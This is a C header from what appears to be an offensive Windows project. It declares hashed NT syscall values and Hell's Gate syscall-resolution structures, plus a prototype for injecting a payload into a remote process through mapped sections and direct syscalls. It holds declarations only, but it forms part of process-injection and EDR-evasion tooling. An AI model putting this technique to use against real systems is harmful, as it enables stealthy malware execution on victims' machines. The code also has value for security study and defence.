#pragma once
#include <Windows.h>

// Hash values of syscalls
#define NtCreateSectionHashValue			0xAC2EDA02
#define NtMapViewOfSectionHashValue			0x92DD00B3
#define NtUnmapViewOfSectionHashValue		0x12D71086
#define NtCloseHashValue					0x7B3F64A4
#define NtCreateThreadExHashValue			0x93EC9D3D
#define NtWaitForSingleObjectHashValue		0xC6F6AFCD
#define NtQuerySystemInformationHashValue	0xEFFC1CF8
#define NtSetInformationFileHashValue		0x8A04AED4

// Data structures
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
	VX_TABLE_ENTRY NtQuerySystemInformation;
} VX_TABLE, * PVX_TABLE;

/// Function prototypes
// Defined in HellsGate.c
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);
BOOL InitializeSyscalls();

// Defined in HellsGateAsm.asm
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

// Defined in Injection.c
BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bIsLocalInjection);

/// Global variables
extern VX_TABLE g_SyscallsTable;

